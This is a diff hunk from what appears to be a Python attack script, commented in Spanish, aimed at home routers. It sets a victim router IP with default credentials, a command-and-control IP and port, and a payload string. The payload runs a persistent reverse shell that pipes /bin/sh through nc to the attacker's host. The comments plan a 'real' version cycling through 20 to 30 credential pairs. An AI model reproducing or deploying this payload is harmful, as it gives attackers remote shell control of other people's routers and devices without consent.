@@ -7,7 +7,7 @@ IP_ROUTER = "192.168.1.1"      #En este caso colocaremos la IP de la victima por
 USER      = "user"             # las credenciales del modem estan en eese formato por que es una demo, para agilizar la explicacion ,en la version futura y real sera diferente ,20 a 30 credenciales -
 PASSWORD  = "user"
 TU_IP     = "192.168.1.4"      # IP , aqui ira la IP donde esta corriendo el C&C (comand & control) , puedes colocar tu propia maquina como C&C 
-TU_PUERTO = "44444"            # puerto donde estara ala escucha 
+TU_PUERTO = "44444"            # puerto  donde inicia/conecta  la conexion saliente en ese puerto
 
 
 PAYLOAD = f"killall nc sh 2>/dev/null; rm -f /tmp/p; mknod /tmp/p p; sh -c 'while :;do /bin/sh 0</tmp/p | nc {TU_IP} {TU_PUERTO} 1>/tmp/p 2>/tmp/p || sleep 20;done'&"
